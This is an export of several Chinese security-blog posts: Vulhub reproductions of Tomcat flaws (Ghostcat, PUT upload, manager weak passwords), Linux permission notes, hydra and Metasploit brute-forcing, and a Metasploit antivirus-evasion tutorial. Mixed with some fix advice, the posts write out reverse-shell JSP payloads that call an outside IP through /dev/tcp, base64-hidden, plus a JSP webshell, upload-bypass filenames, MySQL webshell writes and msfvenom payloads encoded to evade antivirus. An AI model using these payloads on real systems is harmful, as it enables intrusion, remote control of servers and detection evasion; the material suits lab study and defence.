http://www.polaris-lab.com/index.php/archives/66/","categories":[],"tags":[{"name":"复现","slug":"复现","permalink":"http://www.moonback.xyz/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"Vulhub","slug":"Vulhub","permalink":"http://www.moonback.xyz/tags/Vulhub/"},{"name":"phpmyadmin","slug":"phpmyadmin","permalink":"http://www.moonback.xyz/tags/phpmyadmin/"}]},{"title":"Vulhub之tomcat","slug":"Vulhub之tomcat","date":"2020-03-06T14:13:50.000Z","updated":"2020-03-28T03:48:41.783Z","comments":true,"path":"2020/03/06/Vulhub之tomcat/","link":"","permalink":"http://www.moonback.xyz/2020/03/06/Vulhub%E4%B9%8Btomcat/","excerpt":"本篇博客主要介绍了Vulhub上tomcat的漏洞复现，有个还热乎的🤭！","text":"本篇博客主要介绍了Vulhub上tomcat的漏洞复现，有个还热乎的🤭！ CVE-2020-1938漏洞简介2020年2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。 影响范围受影响版本 Apache Tomcat 6 Apache Tomcat 7 &lt; 7.0.100 Apache Tomcat 8 &lt; 8.5.51 Apache Tomcat 9 &lt; 9.0.31 漏洞复现先把环境搭好 漏洞EXP地址(Python)：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/[](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/) tomcat的网站代码默认目录放在webapps/ROOT AJp的默认端口是8009，我们可以用nmap探测以下服务 我们试着读取WEB-INF/web.xml文件 既然是文件包含，能控制文件内容的话就可以rce啊 rce exp:https://github.com/00theway/Ghostcat-CNVD-2020-10487 我们先控制文件内容为 1&lt;% Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45Ny4yMTAuMTQxLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);%&gt; 为啥不能直接用下面的这我也不清楚 1&lt;% Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/47.97.210.141/7777 0&gt;&amp;1&quot;);%&gt; 可以用这个在线网站生成base64那段：http://www.jackson-t.ca/runtime-exec-payloads.html 然后就可以包含了 当然也可以用msf生成和后门 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 &gt; shell.txt 修复意见关闭AJp编辑 &lt;CATALINA_BASE&gt;/conf/server.xml，找到如下行（ 为 Tomcat 的工作目录）： 将此行注释掉（也可删掉该行) 1&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt; 保存后需重新启动Tomcat，规则方可生效。 123cd /usr/local/tomcat/bin./shutdown.sh./startup.sh 不关闭AJp最简单的就是更新至最新版本 如果无法更新我们可以按照下面的操作 使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如，将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值 1&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt; 使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如，将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值 1&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt; 更改之后重启 CVE-2017-12615漏洞简介当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。 在config/web.xml里，在其中找到default servlet的配置项里增加下面一段代码，即将readonly设置成false，便可以通过PUT/DELETE进行文件操控，触发漏洞 1234&lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt; 影响范围受影响版本：Apache Tomcat 7.0.0 - 7.0.79 (windows环境) 漏洞复现懒得装个tomcat了，直接用docker吧 我们直接发个post请求，burp抓包，将POST改成PUT，上传一个shell 123456789101112&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt; 可以看到已经上传成功 default servlet只能处理静态文件，而处理jsp文件是jspservlet，但是只有defaultservlet有PUT上传逻辑，解决的办法是通过构造特殊的后缀名来进行绕过，从而上传jsp木马。 Windows： shell.jsp%20 shell.jsp::$DATA shell.jsp/ shell.jsp/. Linux： shell.jsp/ shell.jsp/. 如果想知道某个站点支持哪些请求方式的话，可以用nmap+script 1nmap 47.97.210.141 -p 8080 --script http-methods -sV 修复意见将readonly的配置改为true Tomcat后台弱口令getshell漏洞简介先介绍一下tomcat的后台管理，环境搭好后，访问发现 发现三个按钮：Server Status,Manager App,Host Manager 分别表示进入服务器状态，管理服务器上部署的应用，管理主机界面 在默认情况下，tomcat的配置文件里没有角色，因为在tomcat的conf文件夹下的tomcat-users.xml文件中，用户是被注释掉的。 1234567&lt;!-- &lt;role rolename=&quot;tomcat&quot;/&gt; &lt;role rolename=&quot;role1&quot;/&gt; &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;tomcat&quot;/&gt; &lt;user username=&quot;both&quot; password=&quot;tomcat&quot; roles=&quot;tomcat,role1&quot;/&gt; &lt;user username=&quot;role1&quot; password=&quot;tomcat&quot; roles=&quot;role1&quot;/&gt;--&gt; 所以点击三个中任意一个按钮，会跳转到一个拒绝的界面 在tomcat-users.xml加入下面的role，再创建一个user，重启服务器输入下面创建的用户名和密码就可以进入管理页面了 123&lt;role rolename=&quot;manager-gui&quot;/&gt; //对应第二个按钮权限&lt;role rolename=&quot;admin-gui&quot;/&gt; //对应第三个按钮权限&lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt; 如果设置的账号密码是弱口令的话，就可以登陆后台进一步getshell 漏洞复现直接点击其中一个，发现要输账号密码 我们尝试burp抓包，进行爆破，这里的账号密码都是tomcat 进入Manager App页面，发现可以上传文件(war包)以及目录显示 war 包是一种打包格式，Java web工程，都是打成war包，进行发布，打成war包的好处是不会缺少目录，并且只管理好一个发布文件就好，并且tomcat服务器能够自动识别，将war包放在tomcat容器的webapps下，启动服务，即可运行该项目，该war包会自动解压出一个同名的文件夹。 直接可以在cmd里生成(有java环境) 1jar -cvf shell.war shell.jsp 上传上去我们发现多了个shell文件夹 可以看到我们已经成功上传一个webshell上去 参考： http://blog.nsfocus.net/cve-2020-1938/ https://paper.seebug.org/399/ https://www.jianshu.com/p/023f3a249a81 https://www.jianshu.com/p/f3e4b5896edb","categories":[],"tags":[{"name":"复现","slug":"复现","permalink":"http://www.moonback.xyz/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"Vulhub","slug":"Vulhub","permalink":"http://www.moonback.xyz/tags/Vulhub/"}]},{"title":"linux相关内容学习","slug":"linux用户及相关命令","date":"2020-03-04T14:35:00.000Z","updated":"2020-06-24T14:52:28.148Z","comments":true,"path":"2020/03/04/linux用户及相关命令/","link":"","permalink":"http://www.moonback.xyz/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/","excerpt":"本篇博客主要介绍了和linux用户及权限的相关内容，权限的东西经常弄混，记一下！","text":"本篇博客主要介绍了和linux用户及权限的相关内容，权限的东西经常弄混，记一下！ Linux权限我们可以用ls -l查看详细信息 linux下的权限可分为三种： r表示读，数字表示为4。对文件来说表示可以读取此文件的实际内容，而对目录来说表示可以读取目录结构列表，即可以查看目录下的文件名和子目录名，注意仅仅是名字 w表示写，数字表示2。对文件来说可以编辑、添加或者是修改该文件的内容，但不包含删除该文件，而对目录来说表示具有更改该目录结构列表的权限，包括新建删除重命名移动文件或者文件夹 x表示执行，数字表示1。对文件来说表示该文件具有可以被系统执行的权限，而对目录来说表示用户可以进入该目录成为工作目录，如果用户对于某个目录不具有x权限，则无法切换到该目录下，也就无法执行该目录下的任何命令，即使具有该目录的r权限。 以图conf.d为例： d代表是目录，-代表文件 rwx代表文件或目录所有者的拥有的权限 r-x代表文件或目录组群的拥有的权限 r-x代表文件或目录其它人的拥有的权限 数字2代表 链接占用的节点个数，如果是目录则表示该目录所含子目录或文件的个数 第一个root表示文件或目录所有者 第二个root代表文件或目录所属组 4096代表的是文件或文件夹的大小，单位字节 然后就是时间了，这里显示的是最后修改时间 软连接和硬连接linux系统中有种文件是链接文件，可以为解决文件的共享使用。链接的方式可以分为两种，一种是硬链接（Hard Link），另一种是软链接或者也称为符号链接（Symbolic Link）。 硬连接硬链接是指通过索引节点来进行链接。在Linux的文件系统中，保存在磁盘分区中的文件不管是什么类型都会给它分配一个编号，这个编号被称为索引节点编号号(Inode Index)或者Inode，它是文件或者目录在一个文件系统中的唯一标识，文件的实际数据放置在数据区域（data block），它存储着文件重要参数信息，也就是元数据 （metadata），比如创建时间、修改时间、文件大小、属主、归属的用户组、读写权限、数据所在block号等，如下图所示。 在Linux系统中，多个文件名指向同一索引节点(Inode)是正常且允许的。一般这种链接就称为硬链接。硬链接的作用之一是允许一个文件拥有多个有效路径名，这样用户就可以建立硬链接到重要的文件，以防止“误删”源数据，不过硬链接只能在同一文件系统中的文件之间进行链接，不能对目录进行创建。之所以文件建立了硬链接就会防止数据误删，是因为文件系统的原理是，只要文件的索引节点还有一个以上的链接（仅删除了该文件的指向），只删除其中一个链接并不影响索引节点本身和其他的链接（数据的实体并未删除），只有当最后一个链接被删除后，此时如果有新数据要存储到磁盘上，被删除的文件的数据块及目录的链接才会被释放，空间被新数据暂用覆盖。 软连接 软链接（也叫符号链接），类似于windows系统中的快捷方式，与硬链接不同，软链接就是一个普通文件，只是数据块内容有点特殊，文件用户数据块中存放的内容是另一文件的路径名的指向，通过这个方式可以快速定位到软连接所指向的源文件实体。软链接可对文件或目录创建。 ln命令n命令格式： ln [参数] [源文件或目录] [目标文件或目录] 主要参数： -i 交互模式，文件存在则提示用户是否覆盖。 -s 软链接(符号链接)。 -d 允许超级用户制作目录的硬链接。 -b 删除，覆盖以前建立的链接 软链接 （符号链接） ln -s source target 硬链接 （实体链接）ln source target 三种时间对于文件来说，三种时间有不同的含义： 访问时间（atime：access time）：读一次文件的内容，atime就会更新。比如对这个文件运用 more、cat等命令。另外ls、stat命令都不会修改文件的访问时间。 修改时间（mtime：modifiy time）：mtime是文件内容最后一次被修改时间。例如vi后保存文件。ls -l列出的时间就是这个时间。 状态改动时间（ctime：change time）：ctime是在写入文件、更改所有者、权限或链接设置时随i节点的内容更改而更改的，是该文件的i节点最后一次被修改的时间，通过chmod、chown命令修改一次文件属性，这个时间就会更新。 可以用stat命令查看三种时间，也可以用ls命令加参数 123ls -lc filename 列出文件的 ctime （最后状态更改时间） ls -lu filename 列出文件的 atime（最后访问时间） ls -l filename 列出文件的 mtime （最后修改时间） 三个重要文件/etc/passwd以下图为例 /etc/passwd文件中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下： 1用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell 用户名(login_name):是代表用户账号的字符串。 口令(passwd):一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于/etc/passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。 用户标识号(UID):是一个整数，系统内部用它来标识用户。一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把它们视为同一个用户，但是它们可以有不同的口令、不同的主目录以及不同的登录Shell等。取值范围是0-65535。0是超级用户root的标识号，1-99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个界限是500。 组标识号(GID):字段记录的是用户所属的用户组。它对应着/etc/group文件中的一条记录。 注释性描述(users):字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等，这个字段并没有什么实际的用途。在不同的Linux系统中，这个字段的格式并没有统一。在许多Linux系统中，这个字段存放的是一段任意的注释性描述文字，用做finger命令的输出。 主目录(home_directory):也就是用户的起始工作目录，它是用户在登录到系统之后所处的目录。在大多数系统中，各用户的主目录都被组织在同一个特定的目录下，而用户主目录的名称就是该用户的登录名。各用户对自己的主目录有读、写、执行（搜索）权限，其他用户对此目录的访问权限则根据具体情况设置。 登录Shell(Shell):用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。Shell是用户与Linux系统之间的接口。Linux的Shell有许多种，每种都有不同的特点。常用的有sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell)等。系统管理员可以根据系统情况和用户习惯为用户指定某个Shell。如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为/bin/sh。 我们可以看到系统中还有一些默认的帐号，如daemon、bin等。这些帐号有着特殊的用途，一般用于进行系统管理。这些帐号的口令大部分用（x）号表示，代表它们不能在登录时使用。 123456bin拥有可执行的用户命令文件 sys拥有系统文件 adm拥有帐户文件 uucpUUCP使用 lplp或lpd子系统使用 nobodyNFS使用 了上面列出的伪用户外，还有许多标准的伪用户，例如：audit,cron,mail,usenet等，它们也都各自为相关的进程和文件所需要。 /etc/group /etc/group 文件是用户组的配置文件，内容包括用户和用户组，并且能显示出用户是归属哪个用户组或哪几个用户组，因为一个用户可以归属一个或多个不同的用户组；同一用 户组的用户之间具有相似的特征。比如我们把某一用户加入到root用户组，那么这个用户就可以浏览root用户家目录的文件，如果root用户把某个文件 的读写执行权限开放，root用户组的所有用户都可以修改此文件，如果是可执行的文件（比如脚本），root用户组的用户也是可以执行的。 在/etc/group 中的每条记录分四个字段：第一字段：用户组名称；第二字段：用户组密码；第三字段：GID第四字段：用户列表，每个用户之间用,号分割；本字段可以为空；如果字段为空表示用户组为GID的用户名； /etc/shadow如下例子： 第一列为账户名称 第二列为密码（账户未设置密码时为!!，设置密码后加密显示） 第三列为上次修改密码的时间距离1970年01月01日多少天 第四列为密码最短有效天数，0表示无限制 第五列为密码最长有效天数（默认位99999天，可以理解为永不过期） 第六列为密码过期后的宽限天数（密码过期后，预留几天给账号修改密码，此时已无法使用旧密码登录） 第八列为账户失效日期（从1970年01月01日起多少天后账户失效） 第九列暂时保留未使用 由示例可知，加密的密码具有固定格式： 1$id$salt$encrypted id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512 salt表示密码学中的Salt,系统随机生成 encrypted表示密码的hash 三个重要命令chmodLinux/Unix 的文件调用权限分为三级 : 文件拥有者、群组、其他。利用 chmod 可以藉以控制文件如何被他人所调用。 使用权限 : 所有使用者 语法1chmod [-cfvR] [--help] [--version] mode file... 参数说明mode : 权限设定字串，格式如下 : 1[ugoa...][[+-&#x3D;][rwxX]...][,...] 其中： u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。 + 表示增加权限、- 表示取消权限、= 表示唯一设定权限。 r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。 其他参数说明 -c : 若该文件权限确实已经更改，才显示其更改动作 -f : 若该文件权限无法被更改也不要显示错误讯息 -v : 显示权限变更的详细资料 -R : 对目前目录下的所有文件与子目录进行相同的权限变更(即以递回的方式逐个变更) –help : 显示辅助说明 –version : 显示版本 chownLinux/Unix 是多人多工操作系统，所有的文件皆有拥有者。利用 chown 将指定文件的拥有者改为指定的用户或组，用户可以是用户名或者用户ID；组可以是组名或者组ID；文件是以空格分开的要改变权限的文件列表，支持通配符。 。 一般来说，这个指令只有是由系统管理者(root)所使用，一般使用者没有权限可以改变别人的文件拥有者，也没有权限可以自己的文件拥有者改设为别人。只有系统管理者(root)才有这样的权限。 使用权限 : root 语法1chown [-cfhvR] [--help] [--version] user[:group] file... 参数 user : 新的文件拥有者的使用者 ID group : 新的文件拥有者的使用者群体(group) -c : 若该文件拥有者确实已经更改，才显示其更改动作 -f : 若该文件拥有者无法被更改也不要显示错误讯息 -h : 只对于连结(link)进行变更，而非该 link 真正指向的文件 -v : 显示拥有者变更的详细资料 -R : 对目前目录下的所有文件与子目录进行相同的拥有者变更(即以递回的方式逐个变更) –help : 显示辅助说明 –version : 显示版本 实例将文件 file1.txt 的拥有者设为 users 群体的使用者 jessie : 1chown jessie:users file1.txt 将目前目录下的所有文件与子目录的拥有者皆设为 users 群体的使用者 lamport : 1chmod -R lamport:users * chgrpLinux chgrp命令用于变更文件或目录的所属群组。 在UNIX系统家族里，文件或目录权限的掌控以拥有者及所属群组来管理。您可以使用chgrp指令去变更文件与目录的所属群组，设置方式采用群组名称或群组识别码皆可。 语法1chgrp [-cfhRv][--help][--version][所属群组][文件或目录...] 或 chgrp [-cfhRv][--help][--reference&#x3D;&lt;参考文件或目录&gt;][--version][文件或目录...] 参数说明-c或–changes 效果类似”-v”参数，但仅回报更改的部分。 -f或–quiet或–silent 不显示错误信息。 -h或–no-dereference 只对符号连接的文件作修改，而不更动其他任何相关文件。 -R或–recursive 递归处理，将指定目录下的所有文件及子目录一并处理。 -v或–verbose 显示指令执行过程。 –help 在线帮助。 –reference=&lt;参考文件或目录&gt; 把指定文件或目录的所属群组全部设成和参考文件或目录的所属群组相同。 –version 显示版本信息。 实例实例1：改变文件的群组属性： 1chgrp -v bin log2012.log 输出： 123[root@localhost test]# ll---xrw-r-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chgrp -v bin log2012.log “log2012.log” 的所属组已更改为 bin 12[root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log 说明： 将log2012.log文件由root群组改为bin群组 实例2：根据指定文件改变文件的群组属性 1chgrp --reference&#x3D;log2012.log log2013.log 输出： 1234567[root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log[root@localhost test]# chgrp --reference&#x3D;log2012.log log2013.log [root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root bin 61 11-13 06:03 log2013.log 说明： 改变文件log2013.log 的群组属性，使得文件log2013.log的群组属性和参考文件log2012.log的群组属性相同 一些常用的命令创建一个用户 创建一个名为shell的用户，不创建家目录，shell为/bin/bash，指定UID号为8888，注释为backdoor 1useradd -c &quot;backdoor&quot; -M -s /bin/bash -u 8888 shell 详细参数信息： -g 指定所属组 -u 指定UID号 -s 指定登录的shell -d 指定家目录 -G 指定属于多个组（附属组） -M 指定不创建家目录 -m 指定创建家目录 -e 账号终止日期，日期指定的格式为MM/DD/YY -f 账号过期几日后永久停权。当值为0时账号立即停权，为-1时则关闭此功能，预设值为-1。 -c 注释 删除用户 1userdel -r admin -r 删除主目录和邮件池 -f 强制删除，即使登录中 更改密码 1echo 123123|passwd --stdin useradmin -n 3 -x 30 -w 7 -i 5 非交互式修改密码为123123，3天内不能更改密码，30天后要求更改密码，密码过期前7天提醒，密码过期后5天禁用账号。 参数： -l 锁定用户 -U 解除用户锁定 -d 删除用户密码 -S （大写） 查看用户状态 -n 表示多少天内不能更改密码 -x 表示多少天以后要求更改密码 -w 表示账户密码过期前多少天提醒 -i 表示密码过期后多少天账号被禁用 –stdin 非交互式修改密码 更改登陆shell 1chsh -s /bin/bash apache 更改apache用户登录shell为/bin/bash 参数： -s 指定登录shell -l 打印shell列表并退出 who命令 123who -b #列出上次系统启动时间who -q #列出所有已登录用户的用户名与用户数量who -u #列出已登录的用户 参考： https://www.cnblogs.com/songgj/p/9115954.html https://blog.csdn.net/a1154490629/article/details/52190801 https://ipcmen.com https://blog.csdn.net/weixin_34010566/article/details/93026151","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://www.moonback.xyz/tags/linux/"}]},{"title":"远程弱口令攻击学习","slug":"远程弱口令攻击学习","date":"2020-02-26T14:04:00.000Z","updated":"2020-03-24T03:53:22.536Z","comments":true,"path":"2020/02/26/远程弱口令攻击学习/","link":"","permalink":"http://www.moonback.xyz/2020/02/26/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/","excerpt":"本篇博客主要介绍了弱口令攻击的一些方式！","text":"本篇博客主要介绍了弱口令攻击的一些方式！ ftphydra1hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 ftp 参数解释： -l root 指定爆破账号为root -w 10 指定每个线程的回应时间为10S -P pwd.txt 指定密码字典为pwd.txt -t 10 指定爆破线程为10个 -v 指定显示爆破过程 -f 查找到第一个可以使用的ID和密码的时候停止破解 msf可以先使用auxiliary/scanner/ftp/ftp_version对版本进行探测 123use auxiliary/scanner/ftp/ftp_versionset rhosts 192.168.0.1exploit 可以看到探测出是开放的，并获取到了ftp的banner信息 破解密码可以使用auxiliary/scanner/ftp/ftp_login 123456use auxiliary/scanner/ftp/ftp_loginset rhost 192.168.1.1set PASS_FILE /root/Desktop/pass.txtset USERPASS_FILE /root/Desktop/name.txtset THREADS 20run sshhydra同样和ftp类似 1hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 ssh msf可以用auxiliary/scanner/ssh/ssh_enumusers这个模块枚举用户 可以用auxiliary/scanner/ssh/ssh_login这个暴力破解 用auxiliary/scanner/ssh/ssh_version探测版本 用auxiliary/scanner/ssh/ssh_login_pubkey进行公钥破解 mysqlhydra1hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 mysql msf使用auxiliary/scanner/mysql/mysql_version可以探测版本 使用auxiliary/admin/mysql/mysql_enum可以获取数据库版本，操作系统名称，架构，数据库目录，数据库用户以及密码哈希值 使用auxiliary/scanner/mysql/mysql_login破解 使用auxiliary/scanner/mysql/mysql_hashdump进行mysql哈希值枚举 1234use auxiliary/scanner/mysql/mysql_hashdumpset username rootset password rootrun 使用auxiliary/admin/mysql/mysql_sql可以连接mysql类似于sqlmap里的–sql-shell 使用auxiliary/scanner/mysql/mysql_schemadump可以将数据库导出到本地 使用auxiliary/scanner/mysql/mysql_file_enum进行文件枚举 使用auxiliary/scanner/mysql/mysql_writable_dirs进行可写目录枚举 mysql攻击方法信息泄露一些网站源代码文件中会包含数据库连接文件，通过查看这些文件可以获取数据库账号和密码。一般常见的数据库连接文件为config.php、web.config、conn.asp、db.php/asp、jdbc.properties、sysconfig.properties、JBOSS_HOME\\docs\\examples\\jca\\XXXX-ds.xml等等。 使用ultraedit等编辑文件编辑数据库配置文件后，会留下bak文件 mysql写马前提需要知道网站的真实物理路径，例如呼求偶真实路径D:\\work\\WWW，则可以通过执行以下查询，来获取一句话后门文件cmd.php 1select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;INTO OUTFILE &#39;D:&#x2F;work&#x2F;WWW&#x2F;shell.php&#39; 当然我们可以用16进制形式写入 1select unhex(&#39;十六进制字符串不用0x&#39;) into dumpfile &#39;D:&#x2F;WEB&#x2F;shell.php&#39; general_log_file写马 （1）查看genera文件配置情况 1show global variables like &quot;%genera%&quot;; （2）关闭general_log 1set global general_log=off; （3）通过general_log选项来获取webshell 12set global general_log=&#x27;on&#x27;;SET global general_log_file=&#x27;D:/phpStudy/WWW/cmd.php&#x27;; 在查询中执行语句： 1SELECT &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;; Shell为cmd.php，一句话后门，密码为cmd。 mssqlhydra1hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 mssql msf使用auxiliary/scanner/mssql/mssql_login破解密码 pcanywhere,vnc,3389同样强大的hydra也支持以上三种，不过最新版本的hydra好像不支持3389的爆破了，只需改变服务类型就行 字典kali的/usr/share/wordlists目录下有很多 参考： https://blog.csdn.net/Fly_hps/article/details/80943541","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"弱口令","slug":"弱口令","permalink":"http://www.moonback.xyz/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"}]},{"title":"metasploit学习","slug":"metasploit学习","date":"2020-02-26T14:03:35.000Z","updated":"2020-04-22T09:51:19.979Z","comments":true,"path":"2020/02/26/metasploit学习/","link":"","permalink":"http://www.moonback.xyz/2020/02/26/metasploit%E5%AD%A6%E4%B9%A0/","excerpt":"本篇博客主要介绍了msf的相关内容！","text":"本篇博客主要介绍了msf的相关内容！ 什么是msf?msf全称Metasploit Framework，它集成了各平台上常见的溢出漏洞和流行的 shellcode ，并且不断更新，是目前世界上领先的渗透测试工具，是迄今为止使用Ruby构建的最复杂的项目之一，是信息安全与渗透测试领域最大的开源项目之一。 介绍几个概念： POC：一般是指证明漏洞存在的代码。 Exploit(EXP)：攻击代码或程序，它允许攻击者利用易受攻击的系统并危害其安全性，每个漏洞都有对应的漏洞利用程序。通俗解释：漏洞利用脚本 Payload：有效攻击载荷。通俗解释就是漏洞利用的主要操作，比如你请求某个url就能写马 ShellCode：主要用在二进制溢出攻击上，比如控制填充数据的内容 msf免杀msfvenommsfvenom简介msfvenom是msfpayload和msfencode的结合体，于2015年6月8日取代了msfpayload和msfencode。在此之后，metasploit-framework下面的的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）都不再被支持。 一些简单的命令比如想查看windows/meterpreter/reverse_tcp支持什么平台、哪些选项，可以使用 1msfvenom -p windows/meterpreter/reverse_tcp --list-options 查看所有payload 1msfvenom --list payloads 查看所有编码器 1msfvenom --list encoders 生成windows木马 1234567msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -x encoder.exe -i 15 -b &#x27;\\x00&#x27; -f exe -o payload.exe# -e指使用哪个编码器# -x指以哪个文件为模板# -i指编码次数# -bs是指去除坏字节# -f指文件类型# -o指输出文件路径 也可以多重编码，使用管道让msfvenom对攻击载荷多重编码，先用shikata_ga_nai编码20次，接着来10次的alpha_upper编码，再来10次的countdown编码，最后才生成以putty.exe为模板的可执行文件。 1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=10.211.55.2 LPORT=3333 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o payload5.exe 经过测试，发现使用的编码类型越多，免杀率可能会降低，猜测是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。 生成linux木马 1msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=47.97.210.141 LPORT=4444 -f elf &gt; shell 参数和上面的一样 几个重要的监听参数防止假session 在实战中，经常会遇到假session或者刚连接就断开的情况，这里补充一些监听参数，防止假死与假session。 1msf exploit(multi/handler) &gt; set ExitOnSession false //可以在接收到seesion后继续监听端口，保持侦听。 防止session意外退出 12msf5 exploit(multi/handler) &gt; set SessionCommunicationTimeout 0 //默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0msf5 exploit(multi/handler) &gt; set SessionExpirationTimeout 0 //默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭 handler后台持续监听 1msf exploit(multi&#x2F;handler) &gt; exploit -j -z 使用exploit -j -z可在后台持续监听,-j为后台任务，-z为持续监听，使用Jobs命令查看和管理后台任务。jobs -K可结束所有任务。 还有种比较快捷的建立监听的方式，在msf下直接执行： 1msf5 &gt; handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp Evasion免杀2019年1月，metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。 evasion有以下几个模块,可以使用show evasion进行查看: 使用windows/windows_defender_exe进行生成payload 123456msf5 &gt; use windows/windows_defender_exemsf5 evasion(windows/windows_defender_exe) &gt; set filename payload.exemsf5 evasion(windows/windows_defender_exe) &gt; set payload windows/meterpreter/reverse_tcpmsf5 evasion(windows/windows_defender_exe) &gt; set LHOST 10.211.55.3msf5 evasion(windows/windows_defender_exe) &gt; set LPORT 3333msf5 evasion(windows/windows_defender_exe) &gt; run msf溢出攻击windowscve_2019_0708https://www.cnblogs.com/Oran9e/p/11479575.html ms17-010https://www.cnblogs.com/nanstar/p/12120656.html ms08-067https://www.cnblogs.com/feizianquan/p/10799873.html 参考： https://www.zhihu.com/question/39878368 https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA 